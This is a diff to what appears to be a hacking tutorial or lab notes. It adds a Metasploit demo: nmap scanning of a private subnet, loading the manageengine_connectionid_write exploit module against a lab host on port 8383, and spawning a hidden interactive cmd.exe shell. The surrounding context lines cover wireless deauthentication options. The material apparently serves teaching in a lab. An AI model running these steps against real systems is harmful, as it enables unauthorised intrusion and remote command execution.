@@ -189,3 +189,21 @@ A wireless Adapter that supports monitor mode and packet injection
 * 10 : No. of deauthentication packets to be sent
 * -a : For the bssid of the target network
 * wlan0 : Name of the interface. 
+<br>
+<br>
+
+# Demo #2
+
+## Using Metasploit Demo
+
+1. nmap -Pn -sn 192.168.22.0/24
+2. nmap -A 192.168.22.11
+3. searchsploit 
+3. msfconsole
+4. use exploit /windows/http/manageengine_connectionid_write
+5. set RHOST 192.168.56.103. *Remember there's two IP's configured. if one IP doesn’t work, try the other one*
+6. set RPORT 8383
+7. set SSL true
+8. set LHOST 192.168.90.5
+9. execute -f cmd.exe -i -H
+10. hostname / whoami
